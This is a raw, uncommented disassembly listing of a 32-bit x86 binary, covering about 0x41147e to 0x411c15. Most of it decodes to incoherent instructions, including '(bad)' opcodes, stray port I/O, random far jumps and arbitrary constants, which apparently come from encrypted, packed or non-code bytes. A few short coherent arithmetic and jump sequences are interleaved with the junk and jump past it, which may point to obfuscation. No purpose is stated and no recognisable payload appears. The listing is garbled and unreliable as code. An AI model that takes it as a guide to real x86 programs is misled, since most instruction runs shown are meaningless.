  41147e:	mov    ah,BYTE PTR [esi]
  411480:	xor    al,0xb5
  411482:	test   ebp,ebx
  411484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411485:	leave  
  411486:	mov    dl,0x59
  411488:	cmp    bh,BYTE PTR [esi+0x2f]
  41148b:	pop    esp
  41148c:	or     eax,0x4ae030ab
  411491:	mov    DWORD PTR [eax-0x5b],esp
  411494:	jbe    0x41145b
  411496:	add    al,0xb8
  411498:	jmp    0x41144a
  41149a:	shl    edi,0xc0
  41149d:	fisttp WORD PTR [ecx+0x24]
  4114a0:	test   eax,0xdd6ef4e7
  4114a5:	ficomp WORD PTR [edi+ebx*8+0x312384ff]
  4114ac:	rol    ebp,0x75
  4114af:	inc    esp
  4114b0:	(bad)  
  4114b1:	lds    esi,FWORD PTR [eax]
  4114b3:	pushf  
  4114b4:	fisub  WORD PTR [ebx]
  4114b6:	push   es
  4114b7:	fdiv   DWORD PTR [edi]
  4114b9:	shr    BYTE PTR [ecx+ebx*1+0x4cca5237],cl
  4114c0:	fs mov bl,0xb4
  4114c3:	and    al,0x88
  4114c5:	adc    eax,0x4e5b5fd7
  4114ca:	xor    dh,dl
  4114cc:	mov    dl,dh
  4114ce:	test   DWORD PTR [edi+0x43],ebp
  4114d1:	push   edi
  4114d2:	push   es
  4114d3:	dec    ecx
  4114d4:	pop    edx
  4114d5:	ret    0x29a2
  4114d8:	xor    DWORD PTR ds:0x306d7455,edx
  4114de:	cmp    ch,BYTE PTR [ecx]
  4114e0:	adc    BYTE PTR [ebx-0x19],0x12
  4114e4:	mov    bh,0x4
  4114e6:	mov    BYTE PTR [ebp+eiz*4+0x3a0f222d],bh
  4114ed:	mov    edi,DWORD PTR es:[ebp-0x8]
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	or     dl,BYTE PTR [eax+0x5dbfc54a]
  411515:	js     0x41158f
  411517:	in     eax,0x7e
  411519:	js     0x411593
  41151b:	or     ebx,DWORD PTR [esi+0x24]
  41151e:	push   ecx
  41151f:	fild   DWORD PTR [ecx-0x7d]
  411522:	dec    esp
  411523:	pop    es
  411524:	jo     0x4114d5
  411526:	or     BYTE PTR [edx+eax*2-0x678b20b8],bl
  41152d:	xor    eax,0xbd266d50
  411532:	mov    bl,0x5d
  411534:	mov    edx,0xa113dc18
  411539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41153a:	and    al,0xe2
  41153c:	xor    BYTE PTR [eax],ch
  41153e:	inc    esi
  41153f:	dec    edi
  411540:	sbb    DWORD PTR [esi+0x42],edi
  411543:	arpl   WORD PTR [eax-0x169e4fa0],ax
  411549:	jne    0x4115b0
  41154b:	cld    
  41154c:	xor    al,0x99
  41154e:	cs xor esi,esp
  411551:	or     BYTE PTR [ecx-0xbca56f],cl
  411557:	dec    ebp
  411558:	push   eax
  411559:	mov    WORD PTR [edx-0x298238c],fs
  41155f:	fsubr  DWORD PTR [edi-0x4f]
  411562:	dec    ebp
  411563:	scas   al,BYTE PTR es:[edi]
  411564:	inc    esi
  411565:	xchg   edi,eax
  411566:	inc    ebx
  411567:	inc    esi
  411568:	sub    ebp,eax
  41156a:	jg     0x411563
  41156c:	rcl    esp,cl
  41156e:	dec    ebp
  41156f:	inc    edx
  411570:	push   esi
  411571:	das    
  411572:	mov    eax,ds:0xd852c51f
  411577:	inc    eax
  411578:	add    DWORD PTR [edx-0x13],0x20
  41157c:	xchg   esp,eax
  41157d:	xor    cl,0x88
  411580:	dec    ebp
  411581:	push   esp
  411582:	adc    edx,ebp
  411584:	sub    ch,bh
  411586:	mov    DWORD PTR [ecx+ecx*4-0x1b],ebx
  41158a:	or     esi,DWORD PTR [esi-0x31]
  41158d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158e:	es xchg edx,eax
  411590:	ins    BYTE PTR es:[edi],dx
  411591:	stc    
  411592:	stos   BYTE PTR es:[edi],al
  411593:	int3   
  411594:	add    ah,bl
  411596:	out    dx,al
  411597:	or     eax,0xb7e6ccbb
  41159c:	outs   dx,BYTE PTR ds:[esi]
  41159d:	push   es
  41159e:	cwde   
  41159f:	jne    0x411620
  4115a1:	or     al,0xb9
  4115a3:	mov    eax,DWORD PTR [edx+0x79]
  4115a6:	xchg   edi,eax
  4115a7:	test   al,0xc8
  4115a9:	aad    0x7c
  4115ab:	xor    esi,ebx
  4115ad:	mov    ah,0xcc
  4115af:	js     0x41156e
  4115b1:	(bad)  [eax+0x707e65ba]
  4115b7:	mov    ds:0x2e696b41,eax
  4115bc:	aad    0xaf
  4115be:	or     ebp,ebp
  4115c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115c1:	push   ds
  4115c2:	hlt    
  4115c3:	xchg   edi,eax
  4115c4:	jo     0x411555
  4115c6:	je     0x41156c
  4115c8:	jb     0x4115de
  4115ca:	mov    DWORD PTR [esp+edi*8],esp
  4115cd:	std    
  4115ce:	push   eax
  4115cf:	xlat   BYTE PTR ds:[ebx]
  4115d0:	xchg   esi,eax
  4115d1:	mov    ecx,0xa12e7fd4
  4115d6:	(bad)  
  4115d7:	push   edx
  4115d8:	call   0x42f7e72d
  4115dd:	loope  0x411582
  4115df:	push   esp
  4115e0:	sub    ah,BYTE PTR [ebp-0x4a76e7db]
  4115e6:	imul   ebx,DWORD PTR [ebp+0x77f5bda7],0x37
  4115ed:	adc    bl,BYTE PTR [ecx+0x561b9876]
  4115f3:	or     al,0xec
  4115f5:	and    ebx,ebp
  4115f7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115f9:	data16 xor dh,BYTE PTR [esi+0x35]
  4115fd:	out    0x98,eax
  4115ff:	leave  
  411600:	mov    BYTE PTR [edi+0x14a745ee],al
  411606:	inc    ecx
  411607:	adc    cl,ch
  411609:	adc    eax,eax
  41160b:	lds    edi,FWORD PTR ds:0x6e933d05
  411611:	pop    ss
  411612:	je     0x411618
  411614:	mov    dl,0xdd
  411616:	shl    BYTE PTR [esi-0x54],cl
  411619:	in     eax,dx
  41161a:	cmp    DWORD PTR [edx-0x13],esi
  41161d:	mov    esi,0xa643fb8e
  411622:	push   esp
  411623:	dec    esp
  411624:	jl     0x411644
  411626:	pop    edi
  411627:	fild   QWORD PTR [eax+0x1bca041c]
  41162d:	hlt    
  41162e:	push   edx
  41162f:	mov    edi,0x5dea937a
  411634:	shl    BYTE PTR [ecx-0x7a8dfd66],0xf1
  41163b:	xor    BYTE PTR [ebx+edx*2+0x77bba419],0x76
  411643:	out    0xe8,al
  411645:	sub    bl,bh
  411647:	add    al,0x8d
  411649:	inc    esi
  41164a:	inc    eax
  41164b:	ins    BYTE PTR es:[edi],dx
  41164c:	je     0x4115f8
  41164e:	jg     0x41169f
  411650:	mov    ds:0xfab7fb30,eax
  411655:	rcl    DWORD PTR es:[eax-0x4c],1
  411659:	xor    al,0xb3
  41165b:	lds    esi,FWORD PTR [ecx]
  41165d:	sbb    ch,bl
  41165f:	in     eax,dx
  411660:	out    dx,al
  411661:	mov    bh,0x64
  411663:	les    edi,FWORD PTR [edx+0x38493642]
  411669:	or     al,0xf5
  41166b:	icebp  
  41166c:	(bad)  
  41166d:	daa    
  41166e:	or     al,0x4
  411670:	sub    al,0xeb
  411672:	add    eax,0x8d304ab8
  411677:	sbb    eax,0x7ba005e
  41167c:	cwde   
  41167d:	sbb    DWORD PTR [edi+edi*8+0x25],esp
  411681:	lock in eax,0x16
  411684:	and    eax,0xe1bbe863
  411689:	inc    ebx
  41168b:	pop    es
  41168c:	xor    DWORD PTR [eax],ecx
  41168e:	push   cs
  41168f:	lods   al,BYTE PTR ds:[esi]
  411690:	cmp    al,0xf9
  411692:	cmp    DWORD PTR [ecx+0x2b30f952],esp
  411698:	add    bh,ch
  41169a:	mov    ecx,edx
  41169c:	std    
  41169d:	pop    edx
  41169e:	mov    fs,WORD PTR [ebx-0x73]
  4116a1:	xchg   esp,eax
  4116a2:	inc    edi
  4116a3:	and    ch,BYTE PTR [ebp+0x59baa7d7]
  4116a9:	adc    eax,0xbb5cd01
  4116ae:	and    BYTE PTR [esi],bl
  4116b0:	mov    ah,0x50
  4116b2:	or     DWORD PTR [edi-0x3c],ebx
  4116b5:	push   0xffffff92
  4116b7:	pop    ebx
  4116b8:	jecxz  0x41169a
  4116ba:	ds push ss
  4116bc:	(bad)  [ebx+0x57]
  4116bf:	test   BYTE PTR [edx+0x45fbdb41],bh
  4116c5:	pop    esp
  4116c6:	adc    al,0x70
  4116c8:	int3   
  4116c9:	outs   dx,BYTE PTR ds:[esi]
  4116ca:	fnstsw WORD PTR [ebx]
  4116cc:	ror    DWORD PTR [edx+edx*1],1
  4116cf:	jb     0x4116c9
  4116d1:	dec    ebx
  4116d2:	mov    cl,0xc3
  4116d4:	mov    dl,0x15
  4116d6:	mov    edi,0x1372db2e
  4116db:	sbb    eax,0x77e9e9ae
  4116e0:	dec    edx
  4116e1:	jnp    0x411668
  4116e3:	inc    ecx
  4116e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e5:	and    al,0x70
  4116e7:	scas   eax,DWORD PTR es:[edi]
  4116e8:	mov    cl,0x62
  4116ea:	add    eax,0xc1f043f7
  4116ef:	push   0x15d5781f
  4116f4:	int    0xf5
  4116f6:	das    
  4116f7:	cmp    eax,0xf99322ca
  4116fc:	out    0x6,al
  4116fe:	lods   eax,DWORD PTR ds:[esi]
  4116ff:	pop    es
  411700:	and    esi,edi
  411702:	iret   
  411703:	or     al,0xd1
  411705:	push   esp
  411706:	daa    
  411707:	(bad)  
  411708:	in     al,0x85
  41170a:	sub    bh,BYTE PTR [edx+edx*1]
  41170d:	mov    dh,0x58
  41170f:	jbe    0x41177b
  411711:	xchg   ebx,eax
  411712:	mov    ds:0xec966fde,eax
  411717:	xlat   BYTE PTR ds:[ebx]
  411718:	fwait
  411719:	push   esp
  41171a:	jbe    0x41177a
  41171c:	pop    es
  41171d:	mov    bl,ah
  41171f:	fbld   TBYTE PTR [edx-0x77d86a49]
  411725:	in     al,dx
  411726:	lahf   
  411727:	imul   BYTE PTR [ecx+0x55]
  41172a:	xchg   ebx,eax
  41172c:	nop
  41172d:	pushf  
  41172e:	aam    0xff
  411730:	mov    ds:0xf59e7423,eax
  411735:	bnd call 0x87a07bb2
  41173b:	pop    es
  41173c:	mov    bl,0xf3
  41173e:	mov    esi,DWORD PTR [ebp+0x4]
  411741:	sub    eax,0x46ffd869
  411746:	aaa    
  411747:	sbb    DWORD PTR [eax+0x67f34e1e],eax
  41174d:	dec    esi
  41174e:	sbb    edx,edx
  411750:	(bad)  
  411752:	or     BYTE PTR ds:0x61ce7a90,dl
  411758:	das    
  411759:	pusha  
  41175a:	lahf   
  41175b:	js     0x411786
  41175d:	push   esi
  41175e:	inc    esp
  41175f:	mov    WORD PTR [esp+edi*8+0x4a38e54a],ds
  411766:	sbb    DWORD PTR [edi],eax
  411768:	int3   
  411769:	and    DWORD PTR [ecx-0x3a3eb4a1],ebx
  41176f:	add    esp,DWORD PTR [ecx+0x3df5f401]
  411775:	ret    
  411776:	into   
  411777:	stc    
  411778:	mov    DWORD PTR [ebp-0x2b],esi
  41177b:	xor    eax,0xdedcf40c
  411780:	sub    esi,DWORD PTR [ebx+0x52ac409e]
  411786:	mov    edx,DWORD PTR [ebp-0x30]
  411789:	jmp    0x411f76
  41178e:	mov    edx,DWORD PTR [ebp-0x38]
  411791:	mov    edi,DWORD PTR [ebp-0x4]
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	xchg   esp,eax
  4117b4:	dec    ebx
  4117b5:	push   edx
  4117b6:	pushf  
  4117b7:	and    al,0x62
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	xchg   BYTE PTR [ebp+ebx*2-0x3856a23f],bh
  4117c6:	arpl   WORD PTR [ecx],di
  4117c8:	add    DWORD PTR [edi+eiz*1],0xb7303697
  4117cf:	or     eax,0xc7d3f7ad
  4117d4:	or     BYTE PTR [ecx-0x5d],al
  4117d7:	cdq    
  4117d8:	aaa    
  4117d9:	adc    al,0x63
  4117db:	cmp    al,0x9e
  4117dd:	lds    eax,FWORD PTR [ecx-0x7]
  4117e0:	xchg   esp,eax
  4117e1:	aad    0x45
  4117e3:	(bad)  
  4117e5:	in     al,0x97
  4117e7:	mov    edx,DWORD PTR [ecx+0x4f]
  4117ea:	mov    fs,WORD PTR [esp+ecx*1-0xc545538]
  4117f1:	dec    edi
  4117f2:	mov    al,0x8d
  4117f4:	xor    ebx,DWORD PTR [esi+0x39092bda]
  4117fa:	push   edi
  4117fb:	push   ecx
  4117fc:	leave  
  4117fd:	jg     0x411863
  4117ff:	or     al,0xb3
  411801:	xchg   ebp,eax
  411802:	iret   
  411803:	cmp    al,0x4
  411805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411806:	inc    ebp
  411807:	iret   
  411808:	adc    esi,edi
  41180a:	jae    0x4117ca
  41180c:	(bad)  [esi+ecx*4+0x1a]
  411810:	jnp    0x41185d
  411812:	xchg   esp,eax
  411813:	into   
  411814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411815:	cwde   
  411816:	aas    
  411817:	ror    DWORD PTR [ebp-0x69f2c391],cl
  41181d:	jbe    0x411865
  41181f:	push   0xffffffc4
  411821:	and    DWORD PTR [edi],0xffffffb4
  411824:	dec    eax
  411825:	pop    edx
  411826:	scas   eax,DWORD PTR es:[edi]
  411827:	retf   0x61ec
  41182a:	retf   0x9d3e
  41182d:	xchg   ebx,eax
  41182e:	(bad)  
  41182f:	in     al,0xf4
  411831:	push   eax
  411832:	iret   
  411833:	out    0x74,al
  411835:	mov    esp,0x41a313ee
  41183a:	push   esi
  41183b:	jo     0x4117e0
  41183d:	cs pop esp
  41183f:	popa   
  411840:	inc    eax
  411841:	pusha  
  411842:	int    0x97
  411844:	add    DWORD PTR [eax-0x29906db8],esi
  41184a:	pop    eax
  41184b:	jle    0x411876
  41184d:	nop
  41184e:	retfw  0x6dcd
  411852:	lds    eax,FWORD PTR [eax-0x2f]
  411855:	pop    ss
  411856:	es and esp,0xffffff95
  41185a:	hlt    
  41185b:	dec    ebx
  41185c:	push   0x33ae97d5
  411861:	mov    esp,DWORD PTR [ecx-0x5b]
  411864:	pop    edx
  411865:	(bad)  
  411866:	add    al,0xf9
  411868:	mov    ds:0xc9ac67b,al
  41186d:	xchg   edx,eax
  41186e:	sub    dh,BYTE PTR [edx+0x7a015e50]
  411874:	mov    DWORD PTR [edi],ecx
  411876:	aas    
  411877:	fucomip st,st(3)
  411879:	shl    BYTE PTR [edi+0xb],cl
  41187c:	lods   al,BYTE PTR ds:[esi]
  41187d:	(bad)
  411880:	xlat   BYTE PTR ds:[ebx]
  411881:	mov    dl,0xb6
  411883:	adc    ch,BYTE PTR [ebp+0x50]
  411886:	ret    0x67f2
  411889:	inc    edi
  41188a:	pop    eax
  41188b:	mov    gs,edi
  41188d:	push   esi
  41188e:	dec    esp
  41188f:	rcl    BYTE PTR [esi+0x3bbdde73],1
  411895:	sub    BYTE PTR [eax+ebx*2-0xc],dl
  411899:	rcr    BYTE PTR [edi],0xf5
  41189c:	xchg   edx,eax
  41189d:	jnp    0x4118c8
  41189f:	out    dx,al
  4118a0:	lods   eax,DWORD PTR ds:[esi]
  4118a1:	sti    
  4118a2:	test   ch,al
  4118a4:	test   al,0xf5
  4118a6:	push   es
  4118a7:	dec    ebp
  4118a8:	jp     0x411873
  4118aa:	dec    eax
  4118ab:	and    esp,DWORD PTR [eax-0x2c8487d8]
  4118b1:	repnz rcl DWORD PTR [edx-0x24107fe8],cl
  4118b8:	inc    esi
  4118b9:	pop    ss
  4118ba:	mov    eax,ds:0x42e94ca3
  4118bf:	mov    gs:0x45937c9f,eax
  4118c5:	inc    esp
  4118c6:	mov    edx,0x93a3d51a
  4118cb:	cld    
  4118cc:	test   BYTE PTR [esi-0x7e],dh
  4118cf:	inc    edi
  4118d0:	pop    esp
  4118d1:	and    BYTE PTR [eax],0xfe
  4118d4:	adc    BYTE PTR [esi+0x4a],bh
  4118d7:	or     DWORD PTR [ecx],esp
  4118d9:	xchg   edi,eax
  4118da:	pop    ecx
  4118db:	inc    ebp
  4118dc:	pop    ebp
  4118dd:	xor    eax,0x9074f829
  4118e2:	ss mov ecx,0xa30f8c0e
  4118e8:	mov    edx,0x3f7b3b7
  4118ed:	fs mov esp,0xd4b95388
  4118f3:	mov    WORD PTR [ecx],ss
  4118f5:	rcr    BYTE PTR [eax+esi*2-0x64],1
  4118f9:	cli    
  4118fa:	sub    edx,DWORD PTR [edx+0x71]
  4118fd:	test   DWORD PTR [ebp-0x3],edx
  411900:	js     0x4118bb
  411902:	mov    ecx,0x32548b59
  411907:	mov    bh,0x5f
  411909:	(bad)  
  41190c:	and    eax,0xfbc78f07
  411911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411912:	pop    es
  411913:	cmp    al,0x33
  411915:	daa    
  411916:	fsubp  st(7),st
  411918:	jae    0x411930
  41191a:	sub    edx,ebx
  41191c:	cmc    
  41191d:	add    esp,DWORD PTR [ebx+0x28]
  411920:	addr16 mov eax,0xb4ee2020
  411926:	mov    ecx,0x7074e708
  41192b:	sbb    bl,BYTE PTR [edi+0xabea1b7]
  411931:	pop    ds
  411932:	lods   eax,DWORD PTR ds:[esi]
  411933:	xchg   ebx,eax
  411934:	jl     0x4119a4
  411936:	pop    ebx
  411937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411938:	adc    DWORD PTR [esi],edi
  41193a:	adc    eax,0x6d9d1cee
  41193f:	pop    ebp
  411940:	(bad)  
  411941:	mov    ah,0xf4
  411943:	sbb    al,0xa0
  411945:	stos   BYTE PTR es:[edi],al
  411946:	mov    ds:0x36e9a23b,eax
  41194b:	push   ebp
  41194c:	push   ebx
  41194d:	js     0x4118fb
  41194f:	xchg   ecx,eax
  411950:	and    eax,0xd7c680ee
  411955:	mov    ds:0x94b563d9,al
  41195a:	loope  0x411970
  41195c:	lock lea ebp,[eax+edi*4+0x1e17f121]
  411964:	sbb    edx,ebp
  411966:	mov    ecx,?
  411968:	(bad)  
  411969:	sbb    al,0x4d
  41196b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41196c:	or     esi,esp
  41196e:	rcl    BYTE PTR [ebp-0xf34bb72],cl
  411974:	mov    DWORD PTR [edx+0x3f],esp
  411977:	int3   
  411978:	div    DWORD PTR [edi-0x74333ab7]
  41197e:	mov    ebp,0x38a11350
  411984:	xchg   ecx,eax
  411985:	jno    0x41195c
  411987:	xchg   edi,eax
  411988:	mov    ebx,0xcb3b6d36
  41198d:	adc    edx,DWORD PTR [ecx+0x7e]
  411990:	retf   0x4ebd
  411993:	cdq    
  411994:	scas   eax,DWORD PTR es:[edi]
  411995:	aaa    
  411996:	(bad)  
  411997:	xor    eax,0x5cb7853f
  41199c:	stos   DWORD PTR es:[edi],eax
  41199d:	adc    ch,BYTE PTR [esi+0x31]
  4119a0:	and    edx,edx
  4119a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a3:	mov    esi,0x60640c9d
  4119a8:	xchg   ecx,eax
  4119a9:	pop    eax
  4119aa:	xchg   ebx,eax
  4119ab:	cdq    
  4119ac:	inc    eax
  4119ad:	mov    ds:0xd3d5d2e7,eax
  4119b2:	xchg   DWORD PTR [esi+0xc],eax
  4119b5:	ret    
  4119b6:	das    
  4119b7:	pop    ss
  4119b8:	hlt    
  4119b9:	cli    
  4119ba:	mov    DWORD PTR [esi+0x17c92aaf],eax
  4119c0:	jno    0x411a1b
  4119c2:	xlat   BYTE PTR ds:[ebx]
  4119c3:	inc    esp
  4119c4:	pusha  
  4119c5:	jo     0x411a3b
  4119c7:	int3   
  4119c8:	inc    esi
  4119c9:	retf   0x12a1
  4119cc:	cld    
  4119cd:	mov    ch,0xfe
  4119cf:	mov    ah,0x66
  4119d1:	cmpxchg BYTE PTR [ebx+0x3e],bh
  4119d5:	inc    ecx
  4119d6:	push   edi
  4119d7:	sbb    ebp,DWORD PTR [ebx-0x1a9c61b2]
  4119dd:	and    BYTE PTR [ebp-0x61452e1],dh
  4119e3:	jnp    0x4119c7
  4119e5:	(bad)  
  4119e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119e7:	mov    al,0x6e
  4119e9:	cmp    BYTE PTR [eax],0x54
  4119ec:	js     0x411a46
  4119ee:	and    dl,BYTE PTR [edx+edx*8+0x1b]
  4119f2:	cmp    al,0xb3
  4119f4:	ins    BYTE PTR es:[edi],dx
  4119f5:	mov    al,ds:0x9bd27174
  4119fa:	in     al,0xed
  4119fc:	add    eax,0x1eddecc9
  411a01:	cmp    BYTE PTR [ebx-0x4d],cl
  411a04:	ja     0x4119cc
  411a06:	test   al,0xe6
  411a08:	inc    edx
  411a09:	add    al,0x11
  411a0b:	mov    edi,DWORD PTR [ebx-0x4fde69a]
  411a11:	cmp    dh,BYTE PTR [esi+0x514df6f2]
  411a17:	jg     0x411a19
  411a19:	outs   dx,BYTE PTR ds:[esi]
  411a1a:	ins    DWORD PTR es:[edi],dx
  411a1b:	jnp    0x4119ff
  411a1d:	mov    ebp,0x921af6fc
  411a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a23:	adc    BYTE PTR [ebx+0x73],0x3
  411a27:	add    bh,bl
  411a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a2a:	mov    ebx,DWORD PTR [ebp-0x10]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0xb0d7da8b
  411a62:	mov    ecx,0x60914cc0
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	hlt    
  411a6e:	int    0xb8
  411a70:	push   edi
  411a71:	jge    0x411ac9
  411a73:	sub    edx,DWORD PTR [esi+0x329caa9d]
  411a79:	addr16 (bad) 
  411a7b:	push   esi
  411a7d:	cmp    DWORD PTR [esi+0xaba0dd8],esi
  411a83:	das    
  411a84:	jge    0x411a91
  411a86:	dec    eax
  411a87:	repnz das 
  411a89:	arpl   WORD PTR [ebx+0x1c],si
  411a8c:	add    eax,0xb88cb6e6
  411a91:	jne    0x411afb
  411a93:	pop    edx
  411a94:	xor    DWORD PTR [eax-0x17533d72],edi
  411a9a:	inc    ebx
  411a9b:	js     0x411aed
  411a9d:	or     BYTE PTR [eax-0x4e],al
  411aa0:	in     eax,0x8e
  411aa2:	fs stos BYTE PTR es:[edi],al
  411aa4:	jl     0x411a2b
  411aa6:	mov    edi,0xd2564fe7
  411aab:	jmp    0xa40c:0xc7053b87
  411ab2:	out    0x1b,eax
  411ab4:	neg    dl
  411ab6:	cmp    BYTE PTR [edx-0x14206997],dh
  411abc:	dec    edx
  411abd:	call   0x5de:0xd8fa0f7e
  411ac4:	mov    esi,0x54259663
  411ac9:	mov    esi,0x7cf8d618
  411ace:	addr16 test eax,0xee0f81d1
  411ad4:	cwde   
  411ad5:	sbb    eax,0xda6738c8
  411ada:	cdq    
  411adb:	and    al,BYTE PTR [ecx+0x7f]
  411ade:	sbb    eax,esi
  411ae0:	mov    bh,BYTE PTR [esi-0x3d]
  411ae3:	push   ecx
  411ae4:	fadd   QWORD PTR [ebx-0x7a8ad0df]
  411aea:	xor    al,0xb4
  411aec:	fcomp  QWORD PTR [ebx-0x536f3abc]
  411af2:	or     BYTE PTR [ebp+ebp*4-0x6],cl
  411af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411af7:	ins    DWORD PTR es:[edi],dx
  411af8:	rcr    BYTE PTR [eax+ebp*1],0x9b
  411afc:	nop
  411afd:	mov    cl,0x56
  411aff:	lods   eax,DWORD PTR ds:[esi]
  411b00:	addr16 popa 
  411b02:	add    dl,BYTE PTR [edi-0x47c13cec]
  411b08:	ins    BYTE PTR es:[edi],dx
  411b09:	push   ss
  411b0a:	loop   0x411afe
  411b0c:	pop    edi
  411b0d:	cmp    ch,BYTE PTR [edi+ebx*8+0x41]
  411b11:	pop    es
  411b12:	(bad)  
  411b14:	xchg   edi,eax
  411b15:	adc    al,ch
  411b17:	imul   ebx,DWORD PTR [edx+ecx*2],0xffffffdf
  411b1b:	dec    ecx
  411b1c:	sub    BYTE PTR [edi+esi*1],dl
  411b1f:	jp     0x411aba
  411b21:	gs mov ecx,0xed0db2b6
  411b27:	hlt    
  411b28:	data16 loop 0x411ad9
  411b2b:	iret   
  411b2c:	fisubr DWORD PTR [esi]
  411b2e:	pop    ebp
  411b2f:	sub    BYTE PTR [ebx-0x10a54b11],0xe8
  411b36:	inc    esp
  411b37:	sbb    cl,0x6e
  411b3a:	cmp    eax,0x1c9f3c8d
  411b3f:	push   0x41c5821f
  411b44:	mov    eax,ds:0x1840aa9b
  411b49:	jmp    0x5603:0x9ee7e1f1
  411b50:	push   cs
  411b51:	shr    DWORD PTR [esi],1
  411b53:	cmp    BYTE PTR [ebx+ebp*1+0x29],dl
  411b57:	mov    dl,0xc7
  411b59:	ss scas al,BYTE PTR es:[edi]
  411b5b:	adc    al,0xd3
  411b5d:	jecxz  0x411b1f
  411b5f:	sbb    BYTE PTR [ecx],0x90
  411b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b64:	(bad)  
  411b65:	hlt    
  411b66:	pop    ss
  411b67:	ins    BYTE PTR es:[edi],dx
  411b68:	outs   dx,DWORD PTR ds:[esi]
  411b69:	adc    dh,BYTE PTR [edx+ebx*4-0x3d]
  411b6d:	adc    ah,0xd8
  411b70:	cmp    esp,esi
  411b72:	sub    eax,0x4107b6fd
  411b77:	daa    
  411b78:	clc    
  411b79:	jmp    0xdc9572df
  411b7e:	dec    eax
  411b7f:	mov    gs,esi
  411b81:	(bad)  
  411b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b83:	adc    ebx,ebx
  411b85:	(bad)  
  411b86:	push   cs
  411b87:	mov    ecx,0x566c26da
  411b8c:	mov    ebp,0x40f1f785
  411b91:	das    
  411b92:	sti    
  411b93:	add    DWORD PTR [ebx+0x7b],ebp
  411b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b97:	sub    cl,BYTE PTR [eax-0x5a]
  411b9a:	cwde   
  411b9b:	in     al,dx
  411b9c:	les    ecx,FWORD PTR [ecx+0x3197957d]
  411ba2:	retf   
  411ba3:	and    al,0x8f
  411ba5:	push   ebx
  411ba6:	add    BYTE PTR [ebx-0x59],dl
  411ba9:	inc    edi
  411baa:	push   ebx
  411bab:	inc    ecx
  411bac:	int3   
  411bad:	mov    DWORD PTR fs:[edx+0x33],esp
  411bb1:	outs   dx,DWORD PTR ds:[esi]
  411bb2:	mov    WORD PTR [ebp-0x22ffdde2],fs
  411bb8:	lds    ebp,FWORD PTR [edi+0x3e]
  411bbb:	pop    ebx
  411bbc:	es mov edx,0xd1d2b814
  411bc2:	cmc    
  411bc3:	inc    ecx
  411bc4:	in     eax,0x6e
  411bc6:	push   edx
  411bc7:	icebp  
  411bc8:	pop    esi
  411bc9:	pop    ds
  411bca:	iret   
  411bcb:	pop    esp
  411bcc:	jge    0x411b72
  411bce:	sub    DWORD PTR [ebp-0x45],ebp
  411bd1:	push   ss
  411bd2:	repnz (bad) 
  411bd4:	fnsave [edx]
  411bd6:	inc    ecx
  411bd7:	mov    edx,0x9466b249
  411bdc:	sahf   
  411bdd:	stc    
  411bde:	xor    eax,0xec1ed2a
  411be3:	cmp    al,0x74
  411be5:	jb     0x411c65
  411be7:	jo     0x411c57
  411be9:	jle    0x411bc9
  411beb:	retf   
  411bec:	xchg   ebp,eax
  411bed:	sub    DWORD PTR [ecx],0xffffff84
  411bf0:	retf   
  411bf1:	inc    ebp
  411bf2:	jns    0x411bf5
  411bf4:	int    0x33
  411bf6:	aad    0xb9
  411bf8:	test   al,0xfb
  411bfa:	sub    esi,DWORD PTR [ecx-0xe]
  411bfd:	inc    edi
  411bfe:	add    al,0x52
  411c00:	adc    eax,0xedc4747c
  411c05:	cdq    
  411c06:	out    0xd5,al
  411c08:	stos   BYTE PTR es:[edi],al
  411c09:	jge    0x411bf6
  411c0b:	jge    0x411c34
  411c0d:	loop   0x411ba9
  411c0f:	(bad)  [eax-0x26320d1c]
  411c15:	dec    edi
